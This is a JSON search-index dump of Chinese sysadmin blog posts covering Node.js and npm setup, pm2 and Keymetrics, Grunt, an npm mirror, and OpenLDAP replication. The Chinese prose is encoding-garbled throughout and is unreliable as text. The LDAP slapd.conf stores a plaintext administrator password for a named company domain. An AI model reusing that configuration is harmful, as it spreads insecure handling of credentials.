PATH so commands you install globally are usable.I added this line to my ~/.path script, which gets run via ~/.bash_profile. è®¾ç½®å˜é‡ï¼š1export PATH=\"$HOME/.node/bin:$PATH\" Now you can re-install any global packages with the command below,replacing the npm modules with whatever global packages you need. æµ‹è¯•npmå®‰è£…http-serverï¼š1npm install -g http-server node-inspector forever nodemon","link":"/2016/08/16/Node.js-npm/Centos7.1+Macç¯å¢ƒå®‰è£…Node.Jsä»¥åŠå½»åº•åˆ é™¤å¸è½½node.jsæ•™ç¨‹/"},{"title":"Node.jsä½¿ç”¨pm2è¿›ç¨‹å®ˆæŠ¤+keymetricså®æ—¶ç›‘æ§Node.jsç¨‹åº","text":"é€šè¿‡pm2èƒ½å®ˆæŠ¤node.jsç¨‹åºæ°¸è¿œåœ¨çº¿ï¼Œåœ¨å®é™…åº”ç”¨ä¸­æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚å¦å¤–ï¼Œpm2é…åˆkeymetricsèƒ½å®æ—¶ç›‘æ§node.jsç¨‹åºçš„è¿è¡Œï¼Œè¾¾åˆ°ç›‘æ§node.jsç¨‹åºçš„ç›®çš„ã€‚ å®‰è£…pm2pm2å¯ä»¥ä½¿æˆ‘ä»¬çš„node.jsæˆ–io.jsç¨‹åºæ°¸è¿œåœ¨çº¿ã€‚è¿™æ˜¯pm2çš„å®˜æ–¹ä»‹ç»ï¼š 1PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks. å‚è€ƒåœ°å€ï¼šhttps://github.com/Unitech/pm2#usagefeatureshttps://www.npmjs.com/package/pm2å®˜ç½‘åœ°å€ï¼šhttp://pm2.keymetrics.io/ npm install -g pm2 å¯åŠ¨ä¸€ä¸ªnode.jsç¨‹åº //è¿›å…¥åˆ°appçš„ç›®å½•å»å¯åŠ¨ pm2 start index.js --name &apos;yjk&apos; å…¶ä»–å¸¸ç”¨å‘½ä»¤ï¼š 1234567891011121314//æŸ¥çœ‹pm2å®ˆæŠ¤çš„apppm2 list//æˆ–è€…pm2 status//é‡å¯ï¼Œrestartåé¢è·Ÿ--nameåé¢æŒ‡å®šçš„åå­—pm2 restart ghost//æŸ¥çœ‹è¿›ç¨‹çš„ä½¿ç”¨èµ„æºæƒ…å†µpm2 monit//æŸ¥çœ‹logpm2 logs ghost//æŸ¥çœ‹appçš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œåé¢è·Ÿidpm2 describe 1//å‡çº§pm2ï¼Œå‡çº§å®Œæ¯•åè‡ªåŠ¨åŠ è½½ä¹‹å‰è¿è¡Œä¸­çš„æ‰€æœ‰appnpm install pm2@latest -g ; pm2 updatePM2 ä½¿ç”¨Keymetricså¯ä»¥é…åˆpm2æ¥ç›‘æ§node.jsç¨‹åºï¼ˆä¹Ÿæ”¯æŒio.jsç¨‹åºçš„ç›‘æ§ï¼‰ã€‚ å®‰è£…Keymetricsé¦–å…ˆéœ€è¦æ³¨å†ŒKeymetrics ç™»å½•åï¼Œé€šè¿‡new bucketæ–°å»ºï¼Œç„¶åè¿›å…¥æ§åˆ¶é¢æ¿ï¼Œå¯ä»¥çœ‹åˆ°åˆ†é…çš„public key å’Œsecret keyã€‚ç„¶åï¼Œåœ¨å®‰è£…æœ‰pm2çš„æœåŠ¡å™¨ç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ 12345678pm2 link Secret key Public key [machine name]pm2 interact your-secret-key your-public-key``` ç›‘æ§æˆåŠŸåï¼Œä¼šæœ‰ç±»ä¼¼ä¸‹é¢çš„æç¤ºï¼š```bash [Keymetrics.io] [Agent created] Agent ACTIVE - Web Access: https://app.keymetrics.io/ Monitor your server with:ç›‘æ§æ‚¨çš„æœåŠ¡å™¨ï¼š pm2 install pm2-server-monit æ­¤æ—¶ï¼Œpm2ä¼šæŠŠæ”¶é›†åˆ°çš„ç»Ÿè®¡ä¿¡æ¯å®æ—¶åœ°æ¨é€åˆ°Keymetricsï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Keymetricsçš„åå°ä¸­å®æ—¶åœ°æŸ¥çœ‹åˆ°node.jsç¨‹åºçš„è¿è¡Œä¿¡æ¯ï¼Œå…¶ä¸­è¿˜æœ‰ä¸€äº›å¿«æ·æ“ä½œï¼Œå¦‚é‡å¯node.jsç¨‹åºç­‰ã€‚ å‚è€ƒå®˜ç½‘ï¼šhttp://pm2.keymetrics.io/docs/usage/quick-start/","link":"/2016/09/24/Node.js-npm/Node.jsä½¿ç”¨pm2è¿›ç¨‹å®ˆæŠ¤+keymetricså®æ—¶ç›‘æ§Node.jsç¨‹åº/"},{"title":"Node.js+Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ","text":"æœ€è¿‘å¼„ç°åº¦å‘å¸ƒç³»ç»Ÿï¼Œç”±äºæœ€è¿‘ä½“æ£€é¡¹ç›®éœ€è¦å¯¹cssæ–‡ä»¶å’Œjsæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œå„ç§æ¯”è¾ƒä¹‹åï¼Œé€‰æ‹©äº†gruntè¿›è¡Œæ„å»ºã€‚googleä¸€ä¸‹ï¼Œå‡ ä¹éƒ½æ˜¯gruntæœ€æ–°ç‰ˆçš„ä½¿ç”¨è¯´æ˜æŸ¥çœ‹gruntjsçš„å…¥é—¨ Getting startedï¼Œåˆæ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½å§ï¼Œåªèƒ½è€å¿ƒçœ‹æ–‡æ¡£å’Œä¸æ–­çš„å®è·µå§ã€‚ Gruntå…¥é—¨å…¥é—¨æ•™ç¨‹: ç³»ç»Ÿç¯å¢ƒcentos 6.6 x64 Gruntå®‰è£…è¿‡ç¨‹ï¼š1ã€å‰æå®‰è£…äº†nodejsï¼Œè¿›å…¥å®˜ç½‘å(http://nodejs.org/)ï¼Œç‚¹å‡»â€œINSTALLâ€æŒ‰é’®ï¼Œå°±ä¼šä¸‹è½½ç„¶åå®‰è£…å°±è¡Œäº†ã€‚è§‰å¾—ç°åœ¨windowså®‰è£…nodeï¼ŒæŒºç®€å•çš„ï¼Œæ„Ÿè§‰ç¨³å®šæ€§ä¹Ÿæå‡äº†ä¸å°‘ã€‚ 2ã€å®‰è£…gruntå‘½ä»¤è¡Œå·¥å…·ï¼Œæœ‰ä¸€å¥è¯æ€»ç»“â€œå°±æ˜¯å®‰è£…å®ŒCLIï¼Œè¿˜è¦åœ¨é¡¹ç›®å®‰è£…Gruntã€‚â€ 1npm install -g grunt-cli å®‰è£…gruntåŠå…¶æ’ä»¶ï¼Œè¿›å…¥åˆ°æŸé¡¹ç›®æ ¹ç›®å½•ï¼Œåœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼Œä¾‹å¦‚æ–‡ä»¶åœ¨cç›˜testGruntç›®å½•ä¸‹ï¼Œåˆ©ç”¨cdå‘½ä»¤åˆ°testGruntç›®å½•ä¸‹åï¼Œä½¿ç”¨å‘½ä»¤: 1npm install grunt --save-dev 3ã€è¾“å…¥ç‰ˆæœ¬å·éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸï¼Œè¾“å…¥ï¼š 1grunt -version åœ¨è¿™é‡Œæˆ‘é€‰æ‹©ä¸€ä¸ªå­˜æ”¾åå°ç®¡ç†çš„æ–‡ä»¶ç›®å½•ã€‚ åˆ›å»ºgrunté¡¹ç›®grunté¡¹ç›®ä¸€èˆ¬éœ€è¦ä»¥ä¸‹å†…å®¹: 1231 ã€gruntï¼ˆ éœ€è¦å®‰è£…ï¼‰2ã€ grunt æ’ä»¶ ï¼ˆéœ€è¦å®‰è£…ï¼‰ 3ã€package.json å’Œ Gruntfile.js ã€‚ (å®˜æ–¹å…¥é—¨Getting started è¯´é€šè¿‡ grunt-init å’Œ npm init åˆ›å»ºã€‚å¯¹äºå…¥é—¨æ¥è¯´ï¼Œè¿™ä¸¤ä¸­æ–¹å¼éƒ½ä¸å¤ªå¥½ç”¨ã€‚æ¨èç›´æ¥åˆ›å»º package.json å’ŒGruntfile.js æ–‡ä»¶) è¿™é‡Œæˆ‘ä¹‹å‰åˆ›å»ºè¿‡ï¼Œç›´æ¥åœ¨å…¶ä»–æœºå™¨ä¸Šé¢cpè¿‡æ¥å³å¯äº†ã€‚ 1234567891011121314151617181920211.åˆ›å»ºæ–‡ä»¶å¤¹:health-Grunt 2.åœ¨health-Gruntä¸‹é¢åˆ›å»º2ä¸ªæ–‡ä»¶package.json å’Œ Gruntfile.js### å®˜ç½‘æ¨èï¼š``` bash package.json å†…å®¹å¦‚ä¸‹&#123; \"name\": \"smeitejs\", \"version\": \"0.1.0\", \"description\": \"js for smeite.com\", \"homepage\": \"http://cc.com/\", \"author\": \"helath &lt;cc@qq.com&gt;\", \"devDependencies\": &#123; \"grunt\": \"~0.4.1\", \"grunt-contrib-jshint\": \"~0.3.0\", \"grunt-contrib-nodeunit\": \"~0.1.2\", \"grunt-contrib-cssmin\": \"~0.5.0\" &#125;&#125; è¿™é‡Œæˆ‘è´´å‡ºæˆ‘çš„æœ¬åœ°é…ç½®ï¼š 12345678910111213141516&#123; \"name\": \"grunt_project\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"devDependencies\": &#123; \"grunt\": \"^0.4.5\", \"grunt-contrib-connect\": \"^0.11.2\", \"grunt-contrib-watch\": \"^0.6.1\" &#125;&#125; Gruntfile.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748module.exports = function(grunt) &#123;// Project configuration.grunt.initConfig(&#123; uglify: &#123; options: &#123; mangle: false &#125;, build: &#123; files: &#123; 'assets/config.min.js': ['js/config.js'], 'assets/smeite.min.js': ['js/smeite.js'], 'assets/index.min.js': ['js/index.js'] &#125; &#125; &#125;,cssmin: &#123; compress: &#123; files: &#123; 'assets/all.min.css': ['css/base.css', 'css/global.css'] &#125; &#125;, // smeite: &#123; // files: &#123; // 'assets/smeite.all.css': ['/play21/smeite.com/public/assets/css/**/*.css'] // &#125; // &#125;, with_banner: &#123; options: &#123; banner: '/* My minified css file test test */' &#125;, files: &#123; 'assets/min/base.css': ['css/base.css'], 'assets/min/global.css': ['css/global.css'] &#125; &#125;&#125;&#125;); // Load the plugin that provides the \"uglify\" task. grunt.loadNpmTasks('grunt-contrib-uglify'); grunt.loadNpmTasks('grunt-contrib-cssmin'); // Default task(s). grunt.registerTask('default', ['uglify']);&#125;; è¿™é‡Œæˆ‘è‡ªå·±é…ç½®çš„ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243module.exports = function (grunt) &#123; grunt.initConfig(&#123; pkg: grunt.file.readJSON('package.json'), connect:&#123; yjklog:&#123; options:&#123; port:8088, ç«¯å£ base:'yjklog/front', æ–‡ä»¶åå°çš„æ—¥å¿—æŸ¥è¯¢çš„ livereload:true, hostname:'192.168.1.133' æœ¬æœºæœºå™¨ &#125; &#125;, yjk:&#123; options:&#123; port:8080, ç«¯å£ base:'yjk/front', åå° livereload:true, hostname:'192.168.1.133' &#125; &#125;, jgs:&#123; options:&#123; port:80, ç«¯å£ base:'yjk/jgs', é¡¹ç›®åå°è®¿é—® livereload:true, hostname:'192.168.1.182' &#125; &#125; &#125;, watch: &#123; options: &#123; livereload: '&lt;%= connect.yjklog.options.livereload %&gt;' &#125;, files: [ '&lt;%= pkg.root %&gt;/app/**/*', '&lt;%= pkg.root %&gt;/assets/**/*' ] &#125; &#125;); grunt.loadNpmTasks('grunt-contrib-connect'); grunt.loadNpmTasks('grunt-contrib-watch'); grunt.registerTask('default', ['connect','watch']);&#125;; æ‰€æœ‰åœ¨Gruntfile.js é…ç½®äº†2ä¸ªgruntæ’ä»¶:grunt-contrib-connect å’Œ grunt-contrib-watchå¦‚æœé¡¹ç›®åªéœ€è¦å‹ç¼©jså’Œcssæ–‡ä»¶ã€‚æ‰€æœ‰åœ¨Gruntfile.js é…ç½®äº†2ä¸ªgruntæ’ä»¶ï¼š grunt-contrib-uglify å’Œ grunt-contrib-cssmin å®‰è£… grunt æ’ä»¶ï¼šåœ¨git å®¢æˆ·ç«¯é”®å…¥å‘½ä»¤ cd /health-Grunt; 1234é”®å…¥å‘½ä»¤ npm install grunt-contrib-watch å®‰è£…watché”®å…¥å‘½ä»¤ npm install grunt-contrib-connect å®‰è£…connecté”®å…¥å‘½ä»¤ npm install grunt-contrib-uglify å®‰è£…uglifyé”®å…¥å‘½ä»¤ npm install grunt-contrib-cssmin å®‰è£…cssmin å®˜æ–¹çš„çš„è¯ï¼šæŸ¥çœ‹ç¬¬4æ­¥ 12344ã€ å‡†å¤‡ç›¸å…³èµ„æ–™åœ¨ testGrunt ç›®å½•ä¸‹ï¼Œåˆ›å»º jsç›®å½•ï¼Œå¹¶åœ¨jsç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶config.js smeite.js index.js ï¼Œåˆ›å»ºcssç›®å½•ï¼Œå¹¶åœ¨cssç›®å½•ä¸‹åˆ›å»ºbase.css å’Œ global.cssã€‚ ï¼ˆè¿™äº›æ–‡ä»¶éƒ½åœ¨Gruntfile.js æœ‰é…ç½®ï¼Œæ‰€ä»¥éœ€è¦åˆ›å»ºï¼Œå†…å®¹å¯ä»¥éšæ„çš„å†™ï¼‰5ã€æ‰§è¡Œgrunt å‘½ä»¤æ‰§è¡Œjså‹ç¼©å‘½ä»¤ grunt uglify æ•ˆæœå¦‚ä¸‹ æˆ‘å‚è€ƒå®˜ç½‘ä¸Šé¢æˆ‘Gruntfile.js æœ‰é…ç½®ï¼Œéœ€è¦åˆ›å»ºè¿™äº›æ–‡ä»¶ç›®å½•ã€‚yjk,front,yjklog.åé¢å°±æ˜¯å‰ç«¯äº‹æƒ…äº†ã€‚å…·ä½“çš„å°±ä¸è¯¦è§£äº†ï¼å¯ä»¥æŸ¥çœ‹æˆ‘githubä¸Šé¢æœ‰è¯¦ç»†çš„æ–‡æ¡£ã€‚ å¯åŠ¨æœåŠ¡ï¼š1åœ¨ç›®å½•å½“å‰åå°å¯åŠ¨: grunt &amp; æ­å»ºåå°ï¼Œéœ€è¦å¯¹åå°çš„ç«¯å£å¼€æ”¾é˜²ç«å¢™è®¾ç½®ã€‚ å»æ‰nginx jsã€cssè§£å‹ç¼©1234567# location ~ .*\\.(js\\|css)?$ &#123;# root /var/www/new/qiantai;# default_type application/x-javascriptï¼›# add_header Vary Accept-Encoding;# add_header Content-Encoding gzip;# gzip off;# &#125;","link":"/2016/11/24/Node.js-npm/Node.js-Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ/"},{"title":"npmç¿»å¢™åŠ é€Ÿå›½å†…é•œåƒ","text":"é—®é¢˜Node.js çš„ä¾èµ–åŒ…ç®¡ç†ç”Ÿæ€ç³»ç»Ÿ npm, æ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„ç”Ÿæ€ç³»ç»Ÿå¼€æºåº“ã€‚ ä½†å›½å†…ä½¿ç”¨ npm æ¥å®‰è£…è½¯ä»¶ï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œæœ‰æ—¶å€™ç”šè‡³ç›´æ¥å°±å¤±è´¥äº†ï¼æ¯”å¦‚æˆ‘å®‰è£…stfå°±éœ€è¦ç¿»å¢™æˆ–è€…VPNå»å®‰è£…ï¼Œå¯æ˜¯å°±ä¸€ç›´å¡ç€ã€‚ åŸå› npm é»˜è®¤æ˜¯ä»å›½å¤–çš„æºè·å–å’Œä¸‹è½½åŒ…ä¿¡æ¯ï¼Œä¸æ…¢æ‰æ€ªï¼Œæœ‰æ—¶ç”šè‡³è¢«å¢™ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸å®‰è£…è½¯ä»¶ã€‚ è§£å†³å¯ä»¥é‡‡ç”¨å›½å†…çš„ npm é•œåƒæ¥è§£å†³ç½‘é€Ÿæ…¢çš„é—®é¢˜ã€‚è¿™é‡Œä»¥â€œæ·˜å® NPM é•œåƒâ€ä¸¾ä¾‹ã€‚æ·˜å® NPM é•œåƒè¿™æ˜¯ä¸€ä¸ªå®Œæ•´ npmjs.org é•œåƒï¼Œä½ å¯ä»¥ç”¨æ­¤ä»£æ›¿å®˜æ–¹ç‰ˆæœ¬(åªè¯»)ï¼ŒåŒæ­¥é¢‘ç‡ç›®å‰ä¸º 10åˆ†é’Ÿ ä¸€æ¬¡ä»¥ä¿è¯å°½é‡ä¸å®˜æ–¹æœåŠ¡åŒæ­¥ï¼Œé•œåƒåœ°å€ä¸º registry.npm.taobao.orgï¼Œ æ˜¯ä» registry.npmjs.org è¿›è¡Œå…¨é‡åŒæ­¥çš„ã€‚ æ–¹æ³•1ï¼šä½¿ç”¨ â€“registryåœ¨å®‰è£…è½¯ä»¶æ—¶ï¼Œä½¿ç”¨ â€“registry æ¥æ³¨å†Œé•œåƒåœ°å€åˆ°å›½å†…çš„é•œåƒ å¦‚ï¼š 1npm install gitbook-cli -g --registry=http://registry.npm.taobao.org è¿™æ ·ï¼Œå®‰è£…è½¯ä»¶é€Ÿåº¦ä¼šå¾ˆå¿«å“¦ã€‚ æ–¹æ³•2ï¼šè®¾ç½® registryæ–¹æ³•1 æ˜¯æ¯æ¬¡ä½¿ç”¨éƒ½éœ€è¦æ³¨å†Œé•œåƒæºï¼Œæœªå…ç¹çã€‚è®¾ç½®å›½å†…çš„é•œåƒä¸ºé»˜è®¤é•œåƒæºï¼Œåˆ™æ›´ä¸ºæ–¹ä¾¿ï¼š 1npm config set registry=http://registry.npm.taobao.org æ–¹æ³•3ï¼šä½¿ç”¨ cnpm1cnpm æ˜¯ npm ä¸­å›½é•œåƒçš„ npm å®¢æˆ·ç«¯ï¼Œå¯ä»¥ä»£æ›¿ npmã€‚ å…ˆç”¨ npm å®‰è£… cnpmï¼š 1npm install -g cnpm --registry=https://registry.npm.taobao.org è€Œåï¼Œå®‰è£…è½¯ä»¶å°±èƒ½ç›´æ¥ç”¨ cnpm ä»£æ›¿ npm äº†ï¼š 1cnpm install [name] å‚è€ƒ http://npm.taobao.org/ https://nodejs.org/docs/latest-v0.12.x/api/","link":"/2016/08/21/Node.js-npm/npmç¿»å¢™åŠ é€Ÿå›½å†…é•œåƒ/"},{"title":"OpenLDAPä¸€ä¸»å¤šä»å¤åˆ¶èŠ‚ç‚¹æœåŠ¡çš„é…ç½®-phpldapadminç®¡ç†è®¤è¯","text":"OpenLDAPä¸»ä»å¤åˆ¶èŠ‚ç‚¹é…ç½®çº¿ä¸Šç‰ˆæœ¬å…¬å¸æœåŠ¡å™¨ä¸Šæ­å»ºäº†ä¸€ä¸ªOpenLDAPæœåŠ¡ï¼Œä¸ºäº†é¿å…å‡ºç°å•ç‚¹ï¼Œéœ€è¦ç»™LDAPåšä¸»ä»è¦ä»å›½å¤–ä»æœåŠ¡å™¨å®æ—¶åŒæ­¥ã€‚è¿™é‡Œæˆ‘ä¹Ÿå‡çº§äº†Openldap é…ç½®ä¸€ä¸»å¤šä»æ–¹æ³•ã€‚äºæ˜¯ä¸Šopenldapå®˜ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹openldapçš„å¤åˆ¶åŠŸèƒ½ã€‚ OpenLDAPè½¯ä»¶2.3ç®¡ç†å‘˜æŒ‡å— OpenLDAPå‰æœŸé…ç½®å‡†å¤‡ï¼š OpenLDAPåŒæ­¥æ¡ä»¶ï¼š 123456789ä¸€ä¸»å¤šä»OpenLDAPé›†ç¾¤æœåŠ¡å™¨ï¼šç‰¹æ„å£°æ˜ä¸‹ï¼š2.3ç‰ˆæœ¬å®ç°ä¸äº†1ä¸»å¤šä»ï¼Œåªèƒ½å®ç°1ä¸»1ä»ã€‚1.Linuxç³»ç»Ÿæœ€å¥½ä¿æŒä¸€è‡´ï¼šCentOS release 6.7 2.LDAPæœåŠ¡å™¨ä¹‹é—´éœ€è¦ä¿æŒæ—¶é—´åŒæ­¥ /usr/sbin/ntpdate ntp.api.bz3.LDAPè½¯ä»¶åŒ…ç‰ˆæœ¬ä¿æŒä¸€è‡´ openldap-2.4.404.èŠ‚ç‚¹ä¹‹é—´çš„åŸŸåå¯ä»¥äº’ç›¸è§£æ 5.é…ç½®LDAPåŒæ­¥å¤åˆ¶ï¼Œéœ€è¦æä¾›å®Œå…¨ä¸€è‡´çš„é…ç½®åŠç›®å½•æ ‘ä¿¡æ¯ ï¼ˆè¿™é‡Œæˆ‘ä¼šé‡ç‚¹è®²å¦‚ä½•åˆå§‹åŒ–æ•°æ®ï¼‰6.æ•°æ®æ¡ç›®ä¿æŒä¸€è‡´ ï¼ˆæ•°æ®å’Œç»“æ„ç›®å½•ç»Ÿä¸€åŒ–ï¼‰7.é¢å¤–çš„schemaæ–‡ä»¶ä¿æŒä¸€è‡´ openldapæ”¯æŒ5ç§å¤åˆ¶æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯:12345Syncreplï¼šslaveæœåŠ¡å™¨ä»masterä¸Šæ‹‰å–æ•°æ®ï¼Œç¼ºç‚¹æ˜¯æ‹‰å–çš„æœ€å°ç²’åº¦æ˜¯å•æ¡è®°å½•Delta-syncreplï¼šä¸ä¸Šä¸€æ¡ç›¸ä¼¼ï¼Œä½†æ‹‰å–çš„æœ€å°ç²’åº¦æ˜¯å±æ€§N-Way Multi-Masterï¼šå¤šä¸»ï¼Œæ”¯æŒ2ä¸ªåŠä»¥ä¸Šçš„masterMirrorModeï¼šåŒä¸»é•œåƒï¼Œä¸æ”¯æŒ3ä¸ªåŠä»¥ä¸Šçš„masterï¼Œä½†å¯ä»¥æœ‰slaveSyncrepl Proxyï¼šä»£ç†æ¨¡å¼ åŒæ­¥éœ€è¦å¼€å¯syncreplæ¨¡å¼ï¼š 123slaveæœåŠ¡å™¨åˆ°masteræœåŠ¡å™¨ä»¥æ‹‰çš„æ¨¡å¼åŒæ­¥ç›®å½•æ ‘ã€‚å½“ä¸»æœåŠ¡å™¨å¯¹æŸä¸ªæ¡ç›®æˆ–æ›´å¤šæ¡ç›®ä¿®æ”¹æ¡ç›®å±æ€§æ—¶ï¼ŒslaveæœåŠ¡å™¨ä¼šæŠŠä¿®æ”¹çš„æ•´ä¸ªæ¡ç›®è¿›è¡ŒåŒæ­¥ï¼Œè€Œä¸æ˜¯å•ç‹¬çš„åŒæ­¥ä¿®æ”¹çš„å±æ€§å€¼ã€‚ æŒ‰ç›®å‰çš„éœ€æ±‚åªè¦é…ç½®æˆMirrorModeå³å¯ï¼Œç¼–è¾‘/etc/openldap/sldap.confæ‰¾åˆ°â€œmoduleload syncprov.laâ€ï¼Œå°†å‰é¢çš„#å·å»æ‰ã€‚ æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼šCentOS_6.x_64 å¤‡æ³¨ï¼š6.0ä»¥ä¸‹ç³»ç»Ÿå®‰è£…ç‰ˆæœ¬ä¼šè¿‡ä½ï¼Œä¸æ”¯æŒä¸€ä¸»å¤šä»é…ç½®ã€‚ è§’è‰² ä¸»æœºå IP åœ°å€ OpenLDAP MAsteræœåŠ¡å™¨ openldap-master 192.168.17.145 OpenLDAP slave1æœåŠ¡å™¨ openldap-slave1 192.168.3.15 OpenLDAP slave2æœåŠ¡å™¨ openldap-slave2 192.168.3.82 å®‰è£…æ–¹æ³•æˆ‘åœ¨å¦å¤–ä¸€ç¯‡å®‰è£…é…ç½®æ–‡æ¡£å¾ˆè¯¦ç»†çš„å†™å‡ºã€‚ è¿™é‡Œæˆ‘å¿«é€Ÿå‘½ä»¤æ“ä½œ ä¸åšå¤ªå¤šçš„å‘½ä»¤æè¿°äº†ã€‚ åˆå§‹åŒ–æ•°æ®ç»“æ„åˆå§‹åŒ–å‘½ä»¤ï¼š 12345678910111213cp -a /var/lib/ldap /var/lib/ldap.backuprm -f /var/lib/ldap/*cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGcp -a /etc/openldap/slapd.d/ /etc/openldap/slapd.dbakuprm -rf /etc/openldap/slapd.d/*chown ldap.ldap /var/lib/ldap/*chmod -R 600 /var/lib/ldap/*chown -R ldap:ldap /etc/openldap/slapd.dcd /var/lib/ldap/ &amp;&amp; slapdslaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.dchown -R ldap:ldap /etc/openldap/slapd.dchown ldap.ldap /var/lib/ldap/*service slapd restart ä¸»æœåŠ¡å™¨ Master | Centos6.6å®‰è£…OpenLDAP1234567891011121314151617181920æ·»åŠ hosté…ç½®ï¼š1.æ—¶é—´åŒæ­¥ï¼šå› ä¸ºä½¿ç”¨çš„æ˜¯xxäº‘ä¸»æœºï¼Œé»˜è®¤æ·»åŠ çš„æœ‰æ—¶é—´åŒæ­¥ï¼Œè¿™é‡Œå°±ä¸åœ¨æè¿°ã€‚yumå¿«é€Ÿå®‰è£…openldap# yum install -y vim automake autoconf gcc xz ncurses-devel \\ patch python-devel git python-pip gcc-c++ # å®‰è£…åŸºæœ¬ç¯å¢ƒï¼Œåé¢ä¾èµ–# yum install -y openldap openldap-servers openldap-clients openldap-develé…ç½® OpenLDAP æœåŠ¡å™¨#æ‹·è´LDAPé…ç½®æ–‡ä»¶åˆ°LDAPç›®å½•# cp /usr/share/openldap-servers/slapd.conf.obsolete /etc/openldap/slapd.conf ## è¯¥æ–‡ä»¶æ˜¯slapdçš„é…ç½®æ–‡ä»¶# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG ## æ•°æ®åº“çš„é…ç½®æ–‡ä»¶# cd /etc/openldap/# cp slapd.conf slapd.conf.bak ç¼–è¾‘LDAPä¸»é…ç½®æ–‡ä»¶ slapd.conf æ–‡ä»¶å¦‚ä¸‹:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155include /etc/openldap/schema/corba.schemainclude /etc/openldap/schema/core.schemainclude /etc/openldap/schema/cosine.schemainclude /etc/openldap/schema/duaconf.schemainclude /etc/openldap/schema/dyngroup.schemainclude /etc/openldap/schema/inetorgperson.schemainclude /etc/openldap/schema/java.schemainclude /etc/openldap/schema/misc.schemainclude /etc/openldap/schema/nis.schemainclude /etc/openldap/schema/openldap.schemainclude /etc/openldap/schema/ppolicy.schemainclude /etc/openldap/schema/collective.schema# Allow LDAPv2 client connections. This is NOT the default.allow bind_v2disallow bind_anon #é˜»æ­¢åŒ¿åç™»é™†# Do not enable referrals until AFTER you have a working directory# service AND an understanding of referrals.#referral ldap://root.openldap.orgpidfile /var/run/openldap/slapd.pidargsfile /var/run/openldap/slapd.args# Load dynamic backend modules# - modulepath is architecture dependent value (32/64-bit system)# - back_sql.la overlay requires openldap-server-sql package# - dyngroup.la and dynlist.la cannot be used at the same timemodulepath /usr/lib/openldapmodulepath /usr/lib64/openldap# moduleload accesslog.la# moduleload auditlog.la# moduleload back_sql.la# moduleload chain.la# moduleload collect.la# moduleload constraint.la# moduleload dds.la# moduleload deref.la# moduleload dyngroup.la# moduleload dynlist.la# moduleload memberof.la# moduleload pbind.la# moduleload pcache.la# moduleload ppolicy.la# moduleload refint.la# moduleload retcode.la# moduleload rwm.la# moduleload seqmod.la# moduleload seqmod.la# moduleload smbk5pwd.la# moduleload sssvlv.lamoduleload syncprov.la# moduleload translucent.la# moduleload unique.la# moduleload valsort.la# The next three lines allow use of TLS for encrypting connections using a# dummy test certificate which you can generate by running# /usr/libexec/openldap/generate-server-cert.sh. Your client software may balk# at self-signed certificates, however.TLSCACertificatePath /etc/openldap/certsTLSCertificateFile \"\\\"OpenLDAP Server\\\"\"TLSCertificateKeyFile /etc/openldap/certs/password# Sample security restrictions# Require integrity protection (prevent hijacking)# Require 112-bit (3DES or better) encryption for updates# Require 63-bit encryption for simple bind# security ssf=1 update_ssf=112 simple_bind=64# Sample access control policy:# Root DSE: allow anyone to read it# Subschema (sub)entry DSE: allow anyone to read it# Other DSEs:# Allow self write access# Allow authenticated users read access# Allow anonymous users to authenticate# Directives needed to implement policy:# access to dn.base=\"\" by * read# access to dn.base=\"cn=Subschema\" by * read# access to *# by self write# by users read# by anonymous auth## if no access controls are present, the default policy# allows anyone and everyone to read anything but restricts# updates to rootdn. (e.g., \"access to * by * read\")## rootdn can always read and write EVERYTHING!access to dn.subtree=\"ou=users,dc=jollychic,dc=com\" by self write by dn=\"cn=Manager,dc=jollychic,dc=com\" write by dn=\"cn=repl,ou=manager,dc=jollychic,dc=com\" write by dn.exact=\"cn=zabbix,ou=manager,dc=jollychic,dc=com\" read by users read by anonymous auth access to * by self write by users read by anonymous auth# enable on-the-fly configuration (cn=config)database configaccess to * by dn.exact=\"gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\" manage by * none# enable server status monitoring (cn=monitor)database monitoraccess to * by dn.exact=\"gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\" read by dn.exact=\"cn=Manager,dc=my-domain,dc=com\" read by * none######################################################################## database definitions#######################################################################database bdbsuffix \"dc=jollychic,dc=com\" checkpoint 1024 15rootdn \"cn=Manager,dc=jollychic,dc=com\"# Cleartext passwords, especially for the rootdn, should# be avoided. See slappasswd(8) and slapd.conf(5) for details.# Use of strong authentication encouraged.# rootpw secret# rootpw &#123;crypt&#125;ijFYNcSNctBYgrootpw se12pa #ç®¡ç†å‘˜å¯†ç # The database directory MUST exist prior to running slapd AND# should only be accessible by the slapd and slap tools.# Mode 700 recommended.directory /var/lib/ldap #å­˜å‚¨ç›®å½•# Indices to maintain for this databaseindex objectClass eq,presindex ou,cn,mail,surname,givenname eq,pres,subindex uidNumber,gidNumber,loginShell 